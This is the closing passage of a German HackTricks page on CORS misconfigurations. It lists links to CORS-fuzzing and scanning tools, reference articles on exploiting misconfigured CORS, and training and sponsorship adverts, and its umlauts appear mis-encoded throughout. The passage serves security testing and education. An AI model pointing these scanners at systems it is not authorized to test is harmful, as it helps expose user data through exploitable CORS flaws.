* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Vorschlag, immer eine Pre-Flight-Anfrage zu senden, wenn √∂ffentliche Server auf interne Server zugreifen m√∂chten

## **Tools**

**Fuzz m√∂gliche Fehlkonfigurationen in CORS-Policies**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## Referenzen

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
